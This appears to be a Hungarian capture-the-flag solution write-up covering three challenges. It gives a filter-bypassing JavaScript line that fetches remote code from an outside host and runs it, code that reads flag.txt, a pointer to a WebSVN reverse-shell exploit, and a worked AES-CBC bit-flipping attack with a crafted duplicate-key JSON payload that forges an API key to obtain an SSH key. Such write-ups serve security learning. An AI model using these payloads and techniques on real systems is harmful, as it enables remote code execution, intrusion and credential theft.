
bonk:
- az alabbi atmegy a szuresen, letolt egy tetszoleges filet, annak tartalmat kieertekeli es kiirja a valaszt a consolera:
fetch("https://csokavar.hu/x.x").then(d => d.text().then(d=>console.log(new Function(d)()))

- a 'backenden' az alabbi javascriptet helyezzuk el:

console.log(require('fs').readFileSync('flag.txt', 'ascii'));


websvn:
itt egy exploit a kerdeses websvn verziohoz:
https://www.exploit-db.com/exploits/50042
ezzel reverse shellt lehet nyitni, a flag.txt a / konyvtarban talalhato.




- megtalaltam a floppy.js-t a vm kodjaban. 
- sikerult deobfuszkalni: https://deobfuscate.relative.im/
- az eredmenyben benne van a flag a feladat elso felehez, es egy ssh kulcs a node felhasznalohoz, amivel be lehet lepni a vm-re.
----------
- a deobfuszkalt floppy.js mukodese alapjan akkor is megoldhato a feladat ha nem ismerjuk a konkret forrast a flag-gel.
- a szerver egy jsont var, amit aes-256 cbc-vel titkositva visszakuld, masodjara ezt a titkositott adatot varja.
- a fenti titkositas nem garantalja az uzenet integritasat, ha benne az egyik aes blokkban egy bitet atbillentunk, akkor
az adott blokk decryptalasa szemetet eredmenyez, a kovetkezo blokkban pedig ugyanaz a bit az ellenkezojere billen.
- ezt felhasznalva az alabbi formatumu jsont kuldunk, figyeljuk meg hogy 2 apiKey mezo van benne:
{"apiKey":"1337d74c985b01ab9d4f996690a8dde658ec307313c1a521810bdcff6d964b4e", "x":"qqqqqqqqqqqqqqqq","apiKey":"","operation":"getSshKey" }
- a szerver a masodik apiKeyt fogja vizsgalni, es mivel nem szerepel benne a "1337" elfogadja, es titkositja. 
- a visszakapott cryptextben atbillentunk a 180-adik byteon egy bitet, es ezt kuldjuk vissza a masodik lepesben.
- ha minden jol megy (nehany probalkozas utan), a kovetkezo formatumu lesz a decryptalt plaintext:

{"apiKey":"1337d74c985b01ab9d4f996690a8dde658ec307313c1a521810bdcff6d964b4e", "x":"qqqqqqqq!@#$%%#$","apiLey":"","operation":"getSshKey" }

- figyeljuk meg hogy az x tartalma elromlott, es a masodik "apiKey" "apiLey"-re valtozott, igy mar csak egy apiKey van a json-ban, az eredeti kulcs.
- azert kell tobbszor probalkozni mert a kapott "szemet" miatt nem mindig lesz valid a JSON.
- a szerver elfogadja az apikeyt es lefuttatja oparationt, visszaadja az ssh kulcsot vagy a flaget.